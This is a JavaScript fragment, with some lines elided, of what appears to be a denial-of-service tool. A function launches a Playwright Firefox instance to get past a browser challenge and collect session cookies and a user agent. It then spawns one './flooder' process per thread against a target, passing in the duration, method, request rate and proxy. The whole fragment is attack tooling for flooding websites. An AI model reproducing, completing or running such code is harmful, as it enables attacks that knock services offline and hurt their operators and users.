...
function solverInstance(args) {
	return new Promise((resolve, reject) => {
		log('(' + 'Browser'.cyan + `)`.white + ` Launching Browser Instance.`.green);
		playwright.firefox.launch({
			...
			log('(' + 'Browser'.cyan + `)` + ' Browser Assigned UA: '.yellow + `${ua}`.green);			
			...
			for (let i = 0; i < args.Threads; i++) {
                spawn('./flooder', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
            }
			log('(' + 'Browser'.green + `) Session Solved.`);
			resolve(cookies);
		})
	})
}
